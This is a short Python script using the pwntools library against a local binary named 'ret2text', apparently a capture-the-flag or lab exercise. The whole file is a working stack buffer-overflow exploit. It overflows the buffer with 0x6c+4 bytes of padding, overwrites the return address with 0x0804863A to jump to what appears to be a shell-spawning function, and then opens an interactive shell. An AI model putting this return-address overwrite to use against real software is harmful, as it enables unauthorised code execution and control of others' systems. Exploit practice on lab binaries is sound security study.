# -*- coding:utf-8 -*-

import pwn
p = pwn.process('./ret2text')
sh_addr = 0x0804863A
p.sendline('a'*(0x6c+4)+pwn.p32(sh_addr))
p.interactive()
